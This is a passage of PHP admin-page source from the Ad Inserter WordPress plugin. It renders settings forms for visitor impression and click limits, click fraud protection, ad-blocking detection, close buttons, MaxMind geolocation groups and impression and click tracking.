                  <?php echo $time_period_clicks; ?>
                </td>
              </tr>
            </tbody>
          </table>
        </div>

        <div class="rounded">
          <table class="responsive-table" style="width: 100%;" cellspacing=0 cellpadding=0 >
            <tbody>
              <tr>
                <td style="display: table-cell; padding-bottom: 8px; padding-right: 10px;">
                  <strong>
                  <?php _e ('Individual visitor limits', 'ad-inserter'); ?>
                  </strong>
                </td>
                <td style="display: table-cell; padding-bottom: 8px;  width: 35%; text-align: center;">
                  <input type="hidden" name="<?php echo AI_OPTION_TRIGGER_CLICK_FRAUD_PROTECTION, WP_FORM_FIELD_POSTFIX, $block; ?>" value="0" title= "<?php _e ('When specified number of clicks on this block for a visitor will be reached in the specified time period, all blocks that have click fraud protection enabled will be hidden for this visitor for the time period defined in general plugin settings.', 'ad-inserter'); ?>"  />
                  <input style="" id="trigger-cfp-<?php echo $block; ?>" type="checkbox" name="<?php echo AI_OPTION_TRIGGER_CLICK_FRAUD_PROTECTION, WP_FORM_FIELD_POSTFIX, $block; ?>" value="1" default="<?php echo $default->get_trigger_click_fraud_protection (); ?>" <?php if ($obj->get_trigger_click_fraud_protection () == AI_ENABLED) echo 'checked '; ?> />
                  <label for="trigger-cfp-<?php echo $block; ?>" title= "<?php _e ('When specified number of clicks on this block for a visitor will be reached in the specified time period, all blocks that have click fraud protection enabled will be hidden for this visitor for the time period defined in general plugin settings.', 'ad-inserter'); ?>"><?php _e ('Trigger click fraud protection', 'ad-inserter'); ?></label>
                  <span title='<?php echo $warning_title_cfp; ?>' style='font-size: 16px; vertical-align: middle; padding: 0; <?php echo $warning_style_cfp; ?>'>&#x26A0;</span>
                </td>
                <td colspan="2" style="display: table-cell; padding-bottom: 8px;">
                </td>
                <td style="display: table-cell; visibility: hidden;">
                  <strong>
                  <?php _e ('Current value', 'ad-inserter'); ?>
                  </strong>
                </td>
              </tr>
              <tr style="padding-bottom: 2px;">
                <td style="display: table-cell; padding-bottom: 4px;">
                  <?php // Translators: Max n impressions ?>
                  <?php _e ('Max', 'ad-inserter'); ?>
                  <input type="text" name="<?php echo AI_OPTION_VISITOR_MAX_IMPRESSIONS, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_visitor_max_impressions (); ?>" value="<?php echo $obj->get_visitor_max_impressions (); ?>" title= "<?php _e ('Maximum number of impressions of this block for each visitor. Empty means no impression limit.', 'ad-inserter'); ?>" size="2" maxlength="6" />
                  <?php // Translators: Max n impressions ?>
                  <?php echo _n ('impression', 'impressions', $obj->get_visitor_max_impressions (), 'ad-inserter'); ?>
                </td>
                <td style="display: table-cell; padding-bottom: 4px;">
                </td>
                <td style="display: table-cell; padding-bottom: 4px;">
                  <?php // Translators: Max n impressions per x days ?>
                  <?php _e ('Max', 'ad-inserter'); ?>
                  <input type="text" name="<?php echo AI_OPTION_VISITOR_LIMIT_IMPRESSIONS_PER_TIME_PERIOD, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_visitor_limit_impressions_per_time_period (); ?>" value="<?php echo $obj->get_visitor_limit_impressions_per_time_period (); ?>" title= "<?php _e ('Maximum number of impressions per time period for each visitor. Empty means no impression limit per time period for visitors.', 'ad-inserter'); ?>" size="2" maxlength="6" />
                  <?php // Translators: Max n impressions per x days ?>
                  <?php echo _n ('impression', 'impressions', $obj->get_visitor_limit_impressions_per_time_period (), 'ad-inserter'); ?>
                </td>
                <td style="display: table-cell; padding-bottom: 4px;">
                  <?php // Translators: Max n impressions per x days ?>
                  <?php echo '&nbsp;'; _e('per', 'ad-inserter'); ?>
                  <input type="text" name="<?php echo AI_OPTION_VISITOR_LIMIT_IMPRESSIONS_TIME_PERIOD, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_visitor_limit_impressions_time_period (); ?>" value="<?php echo $obj->get_visitor_limit_impressions_time_period (); ?>" title= "<?php _e ('Time period in days. Use decimal value (with decimal point) for shorter periods. Empty means no time limit.', 'ad-inserter'); ?>" size="2" maxlength="6" />
                  <?php // Translators: Max n impressions per x days ?>
                  <?php echo _n ('day', 'days', $obj->get_visitor_limit_impressions_time_period (), 'ad-inserter'); ?>
                </td>
                <td style="display: table-cell;">
                </td>
              </tr>
              <tr>
                <td style="display: table-cell; padding-bottom: 4px;">
                  <?php // Translators: Max n clicks ?>
                  <?php _e ('Max', 'ad-inserter'); ?>
                  <input type="text" name="<?php echo AI_OPTION_VISITOR_MAX_CLICKS, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_visitor_max_clicks (); ?>" value="<?php echo $obj->get_visitor_max_clicks (); ?>" title= "<?php _e ('Maximum number of clicks on this block for each visitor. Empty means no click limit.', 'ad-inserter'); ?>" size="2" maxlength="6" />
                  <?php // Translators: Max n clicks ?>
                  <?php echo _n ('click', 'clicks', $obj->get_visitor_max_clicks (), 'ad-inserter'); ?>
                </td>
                <td style="display: table-cell; padding-bottom: 4px;">
                </td>
                <td style="display: table-cell; padding-bottom: 4px;">
                  <?php // Translators: Max n clicks per x days ?>
                  <?php _e ('Max', 'ad-inserter'); ?>
                  <input type="text" name="<?php echo AI_OPTION_VISITOR_LIMIT_CLICKS_PER_TIME_PERIOD, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_visitor_limit_clicks_per_time_period (); ?>" value="<?php echo $obj->get_visitor_limit_clicks_per_time_period (); ?>" title= "<?php _e ('Maximum number of clicks per time period for each visitor. Empty means no click limit per time period for visitors.', 'ad-inserter'); ?>" size="2" maxlength="6" />
                  <?php // Translators: Max n clicks per x days ?>
                  <?php echo _n ('click', 'clicks', $obj->get_visitor_limit_clicks_per_time_period (), 'ad-inserter'); ?>
                </td>
                <td style="display: table-cell; padding-bottom: 4px;">
                  <?php // Translators: Max n clicks per x days ?>
                  <?php echo '&nbsp;'; _e('per', 'ad-inserter'); ?>
                  <input type="text" name="<?php echo AI_OPTION_VISITOR_LIMIT_CLICKS_TIME_PERIOD, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_visitor_limit_clicks_time_period (); ?>" value="<?php echo $obj->get_visitor_limit_clicks_time_period (); ?>" title= "<?php _e ('Time period in days. Use decimal value (with decimal point) for shorter periods. Empty means no time limit.', 'ad-inserter'); ?>" size="2" maxlength="6" />
                  <?php // Translators: Max n clicks per x days ?>
                  <?php echo _n ('day', 'days', $obj->get_visitor_limit_clicks_time_period (), 'ad-inserter'); ?>
                </td>
                <td style="display: table-cell; padding-bottom: 4px;">
                  &nbsp;
                </td>                                                               </tr>
            </tbody>
          </table>
        </div>

      </div>
<?php
  }

  if (defined ('AI_ADBLOCKING_DETECTION') && AI_ADBLOCKING_DETECTION) {
?>
      <div id="tab-adb-<?php echo $block; ?>" class="rounded" style="min-height: 24px;">
<?php  if (!$ai_wp_data [AI_ADB_DETECTION]) echo '<div title="Ad blocking detection is disabled" style="float: left; font-size: 18px;">&#x26A0;</div>', "\n"; ?>
        <?php _e ('When ad blocking is detected', 'ad-inserter'); ?>
        <select style="margin: 0 1px;" id="adb-block-action-<?php echo $block; ?>" name="<?php echo AI_OPTION_ADB_BLOCK_ACTION, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_adb_block_action (); ?>">
          <option value="<?php echo AI_ADB_BLOCK_ACTION_DO_NOTHING; ?>" <?php echo ($obj->get_adb_block_action() == AI_ADB_BLOCK_ACTION_DO_NOTHING) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_DO_NOTHING; ?></option>
          <option value="<?php echo AI_ADB_BLOCK_ACTION_REPLACE; ?>" <?php echo ($obj->get_adb_block_action() == AI_ADB_BLOCK_ACTION_REPLACE) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_REPLACE; ?></option>
          <option value="<?php echo AI_ADB_BLOCK_ACTION_SHOW; ?>" <?php echo ($obj->get_adb_block_action() == AI_ADB_BLOCK_ACTION_SHOW) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_SHOW; ?></option>
          <option value="<?php echo AI_ADB_BLOCK_ACTION_HIDE; ?>" <?php echo ($obj->get_adb_block_action() == AI_ADB_BLOCK_ACTION_HIDE) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_HIDE; ?></option>
        </select>

        <span id="adb-block-replacement-<?php echo $block; ?>" style="float: right; display: none;">
          <?php _e ('replacement', 'ad-inserter'); ?>
          <select style="max-width: 200px;" name="<?php echo AI_OPTION_ADB_BLOCK_REPLACEMENT, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_adb_block_replacement (); ?>" title="<?php _e ('Block to be shown when ad blocking is detected', 'ad-inserter'); ?>">
            <option value="" <?php echo ($obj->get_adb_block_replacement ()== '') ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php _ex ('None', 'replacement', 'ad-inserter'); ?></option>
<?php for ($alt_block = 1; $alt_block <= 96; $alt_block ++) { ?>
            <option value="<?php echo $alt_block; ?>" <?php echo ($obj->get_adb_block_replacement () == $alt_block) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo $alt_block, ' - ', $block_object [$alt_block]->get_ad_name (); ?></option>
<?php
  }
?>
          </select>
        </span>

        <div style="clear: both;"></div>
      </div>
<?php
  }
}

function ai_close_button_select ($block, $close_button, $default_close_button, $id = '', $name = '') {
?>
            <span style="vertical-align: middle;"><?php _e ('Close button', 'ad-inserter'); ?></span>
            &nbsp;&nbsp;
            <select id="<?php echo $id; ?>" name="<?php echo $name; ?>" style="margin: 0 1px;" default="<?php echo $default_close_button; ?>">
               <option
                 data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>"
                 data-img-class="automatic-insertion preview im-close-none"
                 data-title="<?php echo AI_TEXT_NONE; ?>"
                 value="<?php echo AI_CLOSE_NONE; ?>" <?php echo ($close_button == AI_CLOSE_NONE) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_BUTTON_NONE; ?></option>
               <option
                 data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>"
                 data-img-class="automatic-insertion preview im-close-top-left"
                 data-title="<?php echo AI_TEXT_TOP_LEFT; ?>"
                 value="<?php echo AI_CLOSE_TOP_LEFT; ?>" <?php echo ($close_button == AI_CLOSE_TOP_LEFT) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_TOP_LEFT; ?></option>
               <option
                 data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>"
                 data-img-class="automatic-insertion preview im-close-top-right"
                 data-title="<?php echo AI_TEXT_TOP_RIGHT; ?>"
                 value="<?php echo AI_CLOSE_TOP_RIGHT; ?>" <?php echo ($close_button == AI_CLOSE_TOP_RIGHT) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_TOP_RIGHT; ?></option>
               <option
                 data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>"
                 data-img-class="automatic-insertion preview im-close-bottom-left"
                 data-title="<?php echo AI_TEXT_BOTTOM_LEFT; ?>"
                 value="<?php echo AI_CLOSE_BOTTOM_LEFT; ?>" <?php echo ($close_button == AI_CLOSE_BOTTOM_LEFT) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_BOTTOM_LEFT; ?></option>
               <option
                 data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>"
                 data-img-class="automatic-insertion preview im-close-bottom-right"
                 data-title="<?php echo AI_TEXT_BOTTOM_RIGHT; ?>"
                 value="<?php echo AI_CLOSE_BOTTOM_RIGHT; ?>" <?php echo ($close_button == AI_CLOSE_BOTTOM_RIGHT) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_BOTTOM_RIGHT; ?></option>
            </select>
<?php
}

function ai_display_close ($block, $obj, $default, $id, $name = '', $css = '') {
?>
          <span style="display: table-cell; white-space: nowrap;<?php echo $css; ?>">
<?php
  ai_close_button_select ($block, $obj->get_close_button (), $default->get_close_button (), $id, $name);
?>
          </span>
<?php
}

function ai_close_button ($block, $obj, $default) {
?>
        <div class="rounded">
          <table class="responsive-table" style="width: 100%;" cellspacing=0 cellpadding=0 >
            <tbody>
              <tr>
                <td>
  <?php ai_display_close ($block, $obj, $default, 'close-button-'.$block, AI_OPTION_CLOSE_BUTTON . WP_FORM_FIELD_POSTFIX . $block); ?>
                </td>
                <td style="display: table-cell; white-space: nowrap;">
                  <?php _e ('Auto close after', 'ad-inserter'); ?>
                  <input type="text" name="<?php echo AI_OPTION_AUTO_CLOSE_TIME, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_auto_close_time (); ?>" value="<?php echo $obj->get_auto_close_time (); ?>" title= "<?php _e ('Time in seconds in which the ad will automatically close. Leave empty to disable auto closing.', 'ad-inserter'); ?>" size="1" maxlength="5" />
                  s
                </td>
                <td style="display: table-cell; white-space: nowrap; float: right;">
                  <?php // Translators: Don't show for x days ?>
                  <?php _e ('Don\'t show for', 'ad-inserter'); ?>
                  <input type="text" name="<?php echo AI_OPTION_STAY_CLOSED_TIME, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_stay_closed_time (); ?>" value="<?php echo $obj->get_stay_closed_time (); ?>" title= "<?php _e ('Time in days in which closed ad will not be shown again. Use decimal value (with decimal point) for shorter time period or leave empty to show it again on page reload.', 'ad-inserter'); ?>" size="2" maxlength="6" />
                  <?php // Translators: Don't show for x days ?>
                  <?php echo _n ('day', 'days', $obj->get_stay_closed_time (), 'ad-inserter'); ?>
                </td>
              </tr>
            </tbody>
          </table>
        </div>
<?php
}


function ai_delay_showing ($block, $obj, $default) {
?>
        <div class="rounded">
          <table class="responsive-table" style="width: 100%;" cellspacing=0 cellpadding=0 >
            <tbody>
              <tr>
                <td style="display: table-cell; white-space: nowrap; width: 35%;">
                  <?php // Translators: Delay showing for x pageviews ?>
                  <?php _e ('Delay showing for', 'ad-inserter'); ?>
                  <input type="text" name="<?php echo AI_OPTION_DELAY_SHOWING, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_delay_showing (); ?>" value="<?php echo $obj->get_delay_showing (); ?>" title= "<?php _e ('Number of pageviews before the code is inserted (and ad displayed). Leave empty to insert the code for the first pageview.', 'ad-inserter'); ?>" size="1" maxlength="3" />
                  <?php // Translators: Delay showing for x pageviews ?>
                  <?php echo _n ('pageview', 'pageviews', $obj->get_delay_showing (), 'ad-inserter'); ?>
                </td>
                <td style="display: table-cell; white-space: nowrap;">
                  <?php // Translators: Show every x pageviews ?>
                  <?php echo _n ('Show every', 'Show every', $obj->get_show_every (), 'ad-inserter'); ?>
                  <input type="text" name="<?php echo AI_OPTION_SHOW_EVERY, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_show_every (); ?>" value="<?php echo $obj->get_show_every (); ?>" title= "<?php _e ('Number of pageviews to insert the code again. Leave empty to insert the code for every pageview.', 'ad-inserter'); ?>" size="1" maxlength="3" />
                  <?php // Translators: Show every x pageviews ?>
                  <?php echo _n ('pageview', 'pageviews', $obj->get_show_every (), 'ad-inserter'); ?>
                </td>
                <td style="display: table-cell; white-space: nowrap;">
                </td>
              </tr>
            </tbody>
          </table>
        </div>
<?php
}


function ai_display_lazy ($block, $obj, $default) {
?>
              <td style="padding-left: 10px;">
                <input type="hidden" name="<?php echo AI_OPTION_LAZY_LOADING, WP_FORM_FIELD_POSTFIX, $block; ?>" value="0" />
                <input style="" id="lazy-loading-<?php echo $block; ?>" type="checkbox" name="<?php echo AI_OPTION_LAZY_LOADING, WP_FORM_FIELD_POSTFIX, $block; ?>" value="1" default="<?php echo $default->get_lazy_loading (); ?>" <?php if ($obj->get_lazy_loading () == AI_ENABLED) echo 'checked '; ?> />
                <label for="lazy-loading-<?php echo $block; ?>"><?php _e ('Lazy loading', 'ad-inserter'); ?></label>
              </td>
<?php
}

if (is_multisite() && defined ('BLOG_ID_CURRENT_SITE')) {
  $ai_db_options = get_blog_option (BLOG_ID_CURRENT_SITE, AI_OPTION_NAME);

  if (is_string ($ai_db_options) && substr ($ai_db_options, 0, 4) === ':AI:') {
    $ai_db_options = unserialize (base64_decode (substr ($ai_db_options, 4), true));
  }
} else {
    $ai_db_options = ai_get_option (AI_OPTION_NAME);
  }
if (!empty ($ai_db_options [AI_OPTION_GLOBAL]['PLUGIN_TYPE'])) {
  switch ($ai_db_options [AI_OPTION_GLOBAL]['PLUGIN_TYPE']) {
    case 14:
      break;
    case 15:
      define ('AD_INSERTER_ACD', true);
      define ('AD_INSERTER_LIMITS', true);
      define ('AD_INSERTER_CLIENT', true);
      define ('AD_INSERTER_REPORTS', true);
      break;
    case 16:
      define ('AD_INSERTER_GEO_GROUPS', 8);
      define ('AD_INSERTER_ACD', true);
      define ('AD_INSERTER_LIMITS', true);
      define ('AD_INSERTER_MAXMIND', true);
      define ('AD_INSERTER_CLIENT', true);
      define ('AD_INSERTER_REPORTS', true);
      break;
    case 17:
      define ('AD_INSERTER_GEO_GROUPS', 10);
      define ('AD_INSERTER_ACD', true);
      define ('AD_INSERTER_LIMITS', true);
      define ('AD_INSERTER_MAXMIND', true);
      define ('AD_INSERTER_CLIENT', true);
      define ('AD_INSERTER_REPORTS', true);
      break;
  }
}

if (!defined( 'AD_INSERTER_GEO_GROUPS'))  define ('AD_INSERTER_GEO_GROUPS', 6);

function ai_plugin_settings ($start, $end, $exceptions) {
  global $ad_inserter_globals, $block_object;

  $tracking           = get_global_tracking ();
  $internal_tracking  = get_internal_tracking ();
  $external_tracking  = get_external_tracking ();
  $track_logged_in    = get_track_logged_in ();
  $track_pageviews    = get_track_pageviews ();
  $click_detection    = get_click_detection ();

  $geo_db             = get_geo_db ();
  $geo_db_updates     = get_geo_db_updates ();

  $geo_db_class       = defined ('AI_MAXMIND_DB') || !$geo_db_updates ? '' : 'maxmind-db-missing';
  $geo_db_text        = !defined ('AI_MAXMIND_DB') && !$geo_db_updates ? 'missing' : '';
                                                                                                           // Translators: %s MaxMind
  $geo_db_license     = $geo_db == AI_GEO_DB_MAXMIND && $geo_db_updates ? '<span style="float: right;">' . sprintf (__ ('This product includes GeoLite2 data created by %s', 'ad-inserter'), '<a class="simple-link" href="http://www.maxmind.com" target="_blank">MaxMind</a>') . '</span>' : '';
                                                                                                           // Translators: %s HTML tags
  $geo_db_license_key = $geo_db == AI_GEO_DB_MAXMIND && $geo_db_updates ? '<span style="float: right;">' . sprintf (__ ('Create and manage %s MaxMind license key %s', 'ad-inserter'), '<a class="simple-link" href="https://adinserter.pro/documentation/plugin-settings#maxmind" target="_blank">', '</a>') . '</span>' : '';
?>
    <div id="tab-geo-targeting" style="padding: 0px;">

<?php if (defined ('AD_INSERTER_MAXMIND') && (!is_multisite() || is_main_site ())) : ?>

      <div class="responsive-table rounded">
        <table>
          <tbody>
            <tr>
              <td>
                <?php _e ('IP geolocation database', 'ad-inserter'); ?>
              </td>
              <td>
                <select id="geo-db" name="geo-db" default="<?php echo DEFAULT_GEO_DB; ?>" title="<?php _e ('Select IP geolocation database.', 'ad-inserter'); ?>">
                   <option value="<?php echo AI_GEO_DB_WEBNET77; ?>" <?php echo ($geo_db == AI_GEO_DB_WEBNET77) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_WEBNET77; ?></option>
                   <option value="<?php echo AI_GEO_DB_MAXMIND; ?>" <?php echo ($geo_db == AI_GEO_DB_MAXMIND) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_MAXMIND; ?></option>
                </select>
                <?php echo $geo_db_license; ?>
              </td>
            </tr>

<?php if ($geo_db == AI_GEO_DB_MAXMIND): ?>
            <tr>
              <td>
                <?php _e ('Automatic database updates', 'ad-inserter'); ?>
              </td>
              <td>
                <select id="geo-db-updates" name="geo-db-updates" title="<?php _e ('Automatically download and update free GeoLite2 IP geolocation database by MaxMind', 'ad-inserter'); ?>" value="Value" default="<?php echo DEFAULT_GEO_DB_UPDATES; ?>">
                    <option value="<?php echo AI_DISABLED; ?>" <?php echo ($geo_db_updates == AI_DISABLED) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_DISABLED; ?></option>
                    <option value="<?php echo AI_ENABLED; ?>" <?php echo ($geo_db_updates == AI_ENABLED) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_ENABLED; ?></option>
                </select>
              </td>
            </tr>
            <tr>
              <td>
                <?php _e ('MaxMind license key', 'ad-inserter'); ?>
              </td>
              <td>
                <input type="text" id="maxmind-license-key" name="maxmind-license-key" value="<?php echo get_maxmind_license_key (); ?>" default="<?php echo DEFAULT_MAXMIND_LICENSE_KEY; ?>" title="<?php _e ("Enter license key obtained from MaxMind", 'ad-inserter'); ?>" size="22" maxlength="40" />
                <?php echo $geo_db_license_key; ?>
              </td>
            </tr>
            <tr>
              <td>
                <?php _e ('Database', 'ad-inserter'); ?> <span id="maxmind-db-status" class="<?php echo $geo_db_class; ?>" style="color: #f00;"><?php echo $geo_db_text; ?></span>
              </td>
              <td style="width: 73%">
                <input style="width: 100%;" type="text" id="geo-db-location" name="geo-db-location" value="<?php echo get_geo_db_location (true); ?>" default="<?php echo DEFAULT_GEO_DB_LOCATION; ?>" title="<?php _e ("Aabsolute path starting with '/' or relative path to the MaxMind database file", 'ad-inserter'); ?>" size="100" maxlength="140" />
              </td>
            </tr>
<?php endif; ?>
          </tbody>
        </table>
      </div>

<?php endif; ?>

      <div class="responsive-table rounded">
        <table>
          <tbody>
<?php
  for ($group = 1; $group <= AD_INSERTER_GEO_GROUPS; $group ++) {
?>
            <tr>
              <td style="padding-right: 7px;">
                <?php /* translators: %d: group number */ printf (__('Group %d', 'ad-inserter'), $group); ?>
              </td>
              <td style="padding-right: 7px;">
                <input style="margin-left: 0px;" type="text" id="group-name-<?php echo $group; ?>" name="group-name-<?php echo $group; ?>" value="<?php echo get_country_group_name ($group); ?>" default="<?php echo DEFAULT_COUNTRY_GROUP_NAME, ' ', $group; ?>" size="15" maxlength="40" />
              </td>
              <td style="">
                <?php _e ('countries', 'ad-inserter'); ?>
                &nbsp;
                <button id="group-country-button-<?php echo $group; ?>" type="button" class='ai-button' style="display: none; outline: transparent; width: 15px; height: 15px; margin-top: -3px;" title="<?php _e ('Toggle country editor', 'ad-inserter'); ?>"></button>
              </td>
              <td style="width: 70%;">
                <input style="width: 100%;" class="ai-list-uppercase" title="<?php _e ('Comma separated country ISO Alpha-2 codes', 'ad-inserter'); ?>" type="text" id="group-country-list-<?php echo $group; ?>" name="group-country-list-<?php echo $group; ?>" default="" value="<?php echo $ad_inserter_globals ['G'.$group]; ?>" size="54" maxlength="500"/>
              </td>
            </tr>

            <tr>
              <td colspan="4" class="country-flags">
                <select id="group-country-select-<?php echo $group; ?>" data-parameters="<?php echo $group; ?>" multiple="multiple" style="padding: 8px 0; display: none;">
                </select>
              </td>
            </tr>
<?php
  }
?>
          </tbody>
        </table>
      </div>

    </div>

<?php
  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
?>

    <div id="tab-tracking" style="margin: 0px 0; padding: 0;">

      <div style="margin: 8px 0; line-height: 24px;">
        <div style="float: right;">
<?php
  if (get_track_pageviews ()) {
?>
          <span class="ai-toolbar-button" style="float: right;">
            <input type="checkbox" value="0" id="statistics-button-0" nonce="<?php echo wp_create_nonce ("adinserter_data"); ?>" site-url="<?php echo wp_make_link_relative (get_site_url()); ?>" style="display: none;" />
            <label class="checkbox-button" for="statistics-button-0" title="<?php _e ('Toggle Statistics', 'ad-inserter'); ?>"><span class="checkbox-icon icon-statistics"></span></label>
          </span>
<?php
  }
?>
          <span style="float: right;">
            <input type="hidden"   name="tracking" value="0" />
            <input type="checkbox" name="tracking" id="tracking" value="1" default="<?php echo DEFAULT_TRACKING; ?>" <?php if ($tracking == AI_TRACKING_ENABLED) echo 'checked '; ?> style="display: none;" />
            <label class="checkbox-button" style="margin-left: 10px;" for="tracking" title="<?php _e ('Enable impression and click tracking. You also need to enable tracking for each block you want to track.', 'ad-inserter'); ?>"><span class="checkbox-icon icon-enabled<?php if ($tracking == AI_TRACKING_ENABLED) echo ' on'; ?>"></span></label>
          </span>

<?php
  if (defined ('AD_INSERTER_REPORTS') && get_track_pageviews ()) {
?>
          <span class="ai-toolbar-button" style="float: right;">
            <span id="export-statistics-button-0" class="checkbox-button dashicons dashicons-media-text" title="<?php _e ('Generate report', 'ad-inserter'); ?>" style="display: none;"></span>
          </span>
<?php
  }
?>
        </div>

        <div style="vertical-align: sub; display: inline-block;">
          <h3 style="margin: 0; display: inline-block;"><?php _e ('Impression and Click Tracking', 'ad-inserter'); ?></h3>
          <?php if (get_global_tracking () == AI_TRACKING_DISABLED) echo '<span style="color: #f00;"> &nbsp; ', _x ('NOT ENABLED', 'ad blocking detection', 'ad-inserter'), '</span>'; ?>
        </div>
      </div>

      <div style="clear: both;"></div>

<?php
    ai_statistics_container (0, true);
?>

      <div id="tab-tracking-settings">
        <div class="rounded" style="margin: 8px 0 8px;">
          <table style="width: 100%;">
            <tbody>
              <tr>
                <td style="width: 22%;">
                  <?php _e ('Internal', 'ad-inserter'); ?>
                </td>
                <td style="padding: 4px 0px 4px 2px;">
                  <input type="hidden" name="internal-tracking" value="0" />
                  <input type="checkbox" name="internal-tracking" value="1" default="<?php echo DEFAULT_INTERNAL_TRACKING; ?>" title="<?php _e ('Track impressions and clicks with internal tracking and statistics', 'ad-inserter'); ?>" <?php if ($internal_tracking == AI_ENABLED) echo 'checked '; ?> />
                </td>
              </tr>
              <tr>
                <td>
                  <?php _e ('External', 'ad-inserter'); ?>
                </td>
                <td style="padding: 4px 0px 4px 2px;">
                  <input type="hidden" name="external-tracking" value="0" />
                  <input type="checkbox" name="external-tracking" value="1" default="<?php echo DEFAULT_EXTERNAL_TRACKING; ?>" title="<?php _e ('Track impressions and clicks with Google Analytics or Matomo (needs tracking code installed)', 'ad-inserter'); ?>" <?php if ($external_tracking == AI_ENABLED) echo 'checked '; ?> />
                </td>
              </tr>
              <tr>
                <td style="width: 22%;">
                  <?php _e ('Track Pageviews', 'ad-inserter'); ?>
                </td>
                <td>
                  <select
                    id="track-pageviews"
                    name="track-pageviews"
                    title="<?php _e ('Track Pageviews by Device (as configured for viewports)', 'ad-inserter'); ?>"
                    value="Value"
                    default="<?php echo DEFAULT_TRACK_PAGEVIEWS; ?>">
                      <option value="<?php echo AI_TRACKING_DISABLED; ?>" <?php echo ($track_pageviews == AI_TRACKING_DISABLED) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_DISABLED; ?></option>
                      <option value="<?php echo AI_TRACKING_ENABLED; ?>" <?php echo ($track_pageviews == AI_TRACKING_ENABLED) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_ENABLED; ?></option>
                  </select>
                </td>
              </tr>
              <tr>
                <td>
                  <?php _e ('Track for Logged in Users', 'ad-inserter'); ?>
                </td>
                <td>
                  <select
                    id="track-logged-in"
                    name="track-logged-in"
                    title="<?php _e ('Track impressions and clicks from logged in users', 'ad-inserter'); ?>"
                    value="Value"
                    default="<?php echo DEFAULT_TRACKING_LOGGED_IN; ?>">
                      <option value="<?php echo AI_TRACKING_DISABLED; ?>" <?php echo ($track_logged_in == AI_TRACKING_DISABLED) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_DISABLED; ?></option>
                      <option value="<?php echo AI_TRACKING_ENABLED; ?>" <?php echo ($track_logged_in == AI_TRACKING_ENABLED) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_ENABLED; ?></option>
                  </select>
                </td>
              </tr>
              <tr>
                <td>
                  <?php _e ('Click Detection', 'ad-inserter'); ?>
                </td>
                <td>
                  <select
                    id="click-detection"
                    name="click-detection"
                    title="<?php _e ('Standard method detects clicks only on banners with links, Advanced method can detect clicks on any kind of ads, but it is slightly less accurate', 'ad-inserter'); ?>"
                    value="Value"
                    default="<?php echo DEFAULT_CLICK_DETECTION; ?>">
                      <option value="<?php echo AI_CLICK_DETECTION_STANDARD; ?>" <?php echo ($click_detection == AI_CLICK_DETECTION_STANDARD) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_STANDARD; ?></option>
<?php
  if (defined ('AD_INSERTER_ACD')) {
?>
                      <option value="<?php echo AI_CLICK_DETECTION_ADVANCED; ?>" <?php echo ($click_detection == AI_CLICK_DETECTION_ADVANCED) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_ADVANCED; ?></option>
<?php
  }
?>
                  </select>
                </td>
              </tr>
<?php
  if (defined ('AD_INSERTER_LIMITS') && AD_INSERTER_LIMITS) {
?>
              <tr>
                <td>
                <?php _e ('Click fraud protection', 'ad-inserter'); ?>
                </td>
                <td>
                  <span>
                    <select id="cfp" name="cfp"  default="<?php echo DEFAULT_CLICK_FRAUD_PROTECTION; ?>" title="<?php _e ('Globally enable click fraud protection for selected blocks.', 'ad-inserter'); ?>">
                      <option value="<?php echo AI_DISABLED; ?>" <?php echo get_click_fraud_protection () == AI_DISABLED ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_DISABLED; ?></option>
